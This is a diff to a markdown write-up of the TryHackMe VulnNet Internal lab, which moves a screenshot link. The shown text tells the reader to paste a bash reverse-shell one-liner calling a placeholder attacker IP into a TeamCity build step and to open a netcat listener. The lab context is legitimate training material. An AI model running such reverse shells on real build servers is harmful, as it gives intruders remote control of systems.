@@ -179,12 +179,13 @@ afterwards you will see an option at the left hand side which says to build step
 ![image5](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2013-03-14%20TryHackMe%20Configuration%20%E2%80%94%20TeamCity.png)
 
 select the `Command line` option and then paste this reverseshell payload to the command interface
-
-![image6](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2013-27-26%20TryHackMe%20Configuration%20%E2%80%94%20TeamCity.png)
-
 ```bash
 bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'
 ```
+
+![image6](https://github.com/realatharva15/vulnnet_internal_writeup/blob/main/images/Screenshot%202026-01-18%20at%2013-27-26%20TryHackMe%20Configuration%20%E2%80%94%20TeamCity.png)
+
+
 ```bash
 #setup a netcat listener in another terminal:
 nc -lnvp 4444
